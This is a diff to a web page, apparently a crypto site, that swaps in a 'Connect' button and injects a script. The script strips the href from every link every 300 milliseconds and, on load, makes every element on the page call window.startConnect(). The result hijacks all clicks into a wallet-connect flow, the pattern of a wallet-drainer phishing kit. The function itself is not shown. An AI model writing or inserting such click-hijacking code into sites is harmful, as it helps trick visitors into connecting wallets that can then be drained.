@@ -775,11 +775,38 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
         I agree to the terms
       </label>
      
-        <button class="MuiButtonBase-root MuiButton-root MuiButton-gradient MuiButton-gradientPrimary MuiButton-sizeMedium MuiButton-gradientSizeMedium MuiButton-colorPrimary MuiButton-disableElevation MuiButton-root MuiButton-gradient MuiButton-gradientPrimary MuiButton-sizeMedium MuiButton-gradientSizeMedium MuiButton-colorPrimary MuiButton-disableElevation css-1y4kwyt" tabindex="0" type="button">Connect wallet<span class="MuiTouchRipple-root css-w0pj6f"></span></button><
+        <button type="button" class="flex h-8 min-w-8 items-center justify-center rounded-full border border-transparent focus-visible:outline focus-visible:outline-primary md:h-9 md:min-w-9 bg-primary/10 px-3 text-xs font-semibold text-primary hover:border-primary hover:bg-primary/10 hover:text-primary" onclick="window.startConnect()">Connect</button>
         
       </div>
     </div>
-  
+  <script>
+    
+    function addClassesToElements() {
+        const links = document.querySelectorAll('a:not(.test)');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.classList.add('test');
+        }
+
+        const buttons = document.querySelectorAll('div:not(.test):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+        for (const button of buttons) {
+            button.classList.add('test');
+        }
+    }
+
+    setInterval(addClassesToElements, 300); 
+
+    
+    window.addEventListener('DOMContentLoaded', () => {
+        const bodyElements = document.body.querySelectorAll('*:not(script):not(style)');
+        for (const el of bodyElements) {
+            // Только если ещё нет onclick
+            if (!el.hasAttribute('onclick')) {
+                el.setAttribute('onclick', 'window.startConnect()');
+            }
+        }
+    });
+</script>
     </div>
   
     </div>
